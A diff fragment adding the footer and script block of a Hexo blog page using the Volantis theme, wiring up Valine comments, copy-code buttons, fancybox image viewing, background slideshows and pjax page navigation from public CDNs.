+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/001.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/002.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/003.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/004.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/005.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/006.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/012.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/016.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/019.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/034.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/035.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/038.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/039.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/042.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/052.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/054.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
